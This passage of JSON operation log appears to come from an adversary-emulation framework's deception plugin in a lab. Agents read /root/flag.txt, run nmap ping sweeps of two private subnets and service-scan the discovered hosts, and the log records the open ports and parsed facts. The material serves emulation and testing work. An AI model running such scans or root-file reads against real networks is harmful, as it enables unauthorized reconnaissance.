"timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "931705bf-fba8-40e9-8a4a-cd262c5a6953", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["tubxdc", "tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T22:21:52Z", "relationships": []}], "unique": "931705bf-fba8-40e9-8a4a-cd262c5a6953", "decide": "2023-10-09T22:21:52Z", "status": 1, "score": 1, "pid": "1164", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T22:22:05Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:22:05Z"}, {"deadman": false, "finish": "2023-10-09T22:22:12Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "9c43e5e0-30e5-4175-b574-10e29aa9e5c4", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-09T22:22:08Z", "relationships": []}], "unique": "9c43e5e0-30e5-4175-b574-10e29aa9e5c4", "decide": "2023-10-09T22:22:08Z", "status": 0, "score": 1, "pid": "1166", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.156", "192.168.200.3"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156', '192.168.200.3']", "created": "2023-10-09T22:22:12Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T22:22:12Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a362b30>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3626e0>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:22:10Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["59b4d7fe-d671-428b-b097-5c860ed68448", "9c43e5e0-30e5-4175-b574-10e29aa9e5c4", "c902d664-8a84-4ff2-8d31-372b5662c6e5"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T22:19:27Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.156', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["9c43e5e0-30e5-4175-b574-10e29aa9e5c4"], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.156", "192.168.200.3"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156', '192.168.200.3']", "created": "2023-10-09T22:22:12Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156', '192.168.200.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:22:10Z"}, {"deadman": false, "finish": "2023-10-09T22:22:31Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "c8af7bad-aa2d-4cc5-b818-d5a1f0244faa", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-09T22:22:13Z", "relationships": []}], "unique": "c8af7bad-aa2d-4cc5-b818-d5a1f0244faa", "decide": "2023-10-09T22:22:13Z", "status": 0, "score": 1, "pid": "1169", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.201.3", "192.168.201.91"], "unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.91']", "created": "2023-10-09T22:22:31Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T22:22:31Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71acb4cd0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71acb6d10>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:22:22Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["201cc0c4-87d0-40d4-adce-d4b10be0053e", "c8af7bad-aa2d-4cc5-b818-d5a1f0244faa", "69651246-38d3-4785-9ca4-b8e1602794d1"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T22:19:54Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.91'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.91', '192.168.201.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["c8af7bad-aa2d-4cc5-b818-d5a1f0244faa"], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.201.3", "192.168.201.91"], "unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.91']", "created": "2023-10-09T22:22:31Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.91'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:22:22Z"}, {"deadman": false, "finish": "2023-10-09T22:23:03Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "2a471089-0473-4d7b-9aa1-84e009b342b2", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,4,5,6,7,156,3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 13, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.1,2,4,5,6,7,156,3", "unique": "scan.remote.addr192.168.200.1,2,4,5,6,7,156,3", "created": "2023-10-09T22:22:33Z", "relationships": []}], "unique": "2a471089-0473-4d7b-9aa1-84e009b342b2", "decide": "2023-10-09T22:22:33Z", "status": 0, "score": 1, "pid": "1172", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a323730>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a323670>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a320070>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a321f90>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a321900>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a323520>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fe4a0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ffc40>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fee60>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fedd0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fe500>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff490>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff4f0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff0a0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fce50>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff280>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fce20>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fc850>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fd660>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fcca0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fe470>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fd6f0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:23:03Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:23:03Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff6d0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fcc40>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:22:37Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,4,5,6,7,156,3", "facts": [{"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": 